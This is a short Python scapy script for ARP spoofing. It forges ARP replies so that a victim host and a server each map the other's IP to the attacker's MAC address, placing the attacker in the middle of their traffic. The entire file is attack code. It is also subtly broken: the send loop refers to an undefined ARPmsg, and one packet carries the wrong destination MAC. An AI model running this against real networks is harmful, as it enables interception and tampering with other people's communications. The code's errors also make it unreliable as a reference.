from scapy.all import *

import time

interface = conf.iface

macAttacker = get_if_hwaddr(interface)
ipAttacker = get_if_addr(interface)


macVictim = "ff:ff:ff:ff:ff:ff"
ipVictim = "255.255.255.255"

macServer = "ff:ff:ff:ff:ff:ff"
ipServer = "255.255.255.255"



def MIMspoofARP(ipVictim, ipServer):
    macVictim = getmacbyip(ipVictim)
    macServer = getmacbyip(ipServer)

    arpTo = Ether() / ARP()
    arpTo[Ether].src = macAttacker
    arpTo[ARP].hwsrc = macAttacker
    arpTo[ARP].psrc = ipServer
    arpTo[ARP].hwdst = macServer
    arpTo[ARP].pdst = ipVictim

    arpFrom = Ether() / ARP()
    arpFrom[Ether].src = macAttacker
    arpFrom[ARP].hwsrc = macAttacker
    arpFrom[ARP].psrc = ipVictim
    arpFrom[ARP].hwdst = macServer
    arpFrom[ARP].pdst = ipServer

    while(True):
        sendp(ARPmsg[0], iface=interface)
        sendp(ARPmsg[1], iface=interface)
        time.sleep(3600)